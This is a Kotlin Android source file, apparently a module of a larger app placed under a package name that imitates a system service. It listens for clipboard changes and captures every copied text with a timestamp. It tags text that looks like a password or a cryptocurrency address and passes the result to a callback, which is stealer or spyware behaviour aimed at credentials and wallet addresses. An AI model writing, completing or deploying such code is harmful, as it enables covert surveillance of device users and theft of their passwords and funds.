// [context: Kotlin, Android API 26+, clipboard content monitoring]
package com.system.service.modules.clipboard

import android.content.ClipboardManager
import android.content.Context
import org.json.JSONObject

class ClipboardMonitor(private val context: Context) {

    private val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
    var onClip: ((JSONObject) -> Unit)? = null

    fun start() {
        cm.addPrimaryClipChangedListener {
            val clip = cm.primaryClip ?: return@addPrimaryClipChangedListener
            if (clip.itemCount == 0) return@addPrimaryClipChangedListener
            val text = clip.getItemAt(0)?.text?.toString() ?: return@addPrimaryClipChangedListener
            if (text.isEmpty()) return@addPrimaryClipChangedListener
            val obj = JSONObject().apply {
                put("ts", System.currentTimeMillis())
                put("text", text)
                put("is_password_like", looksLikePassword(text))
                put("is_crypto_addr", looksLikeCryptoAddress(text))
            }
            onClip?.invoke(obj)
        }
    }

    private fun looksLikePassword(s: String): Boolean =
        s.length in 8..64 && s.any { it.isDigit() } && s.any { it.isUpperCase() }

    private fun looksLikeCryptoAddress(s: String): Boolean =
        (s.startsWith("1") || s.startsWith("3") || s.startsWith("bc1") ||
         s.startsWith("0x")) && s.length in 26..62
}
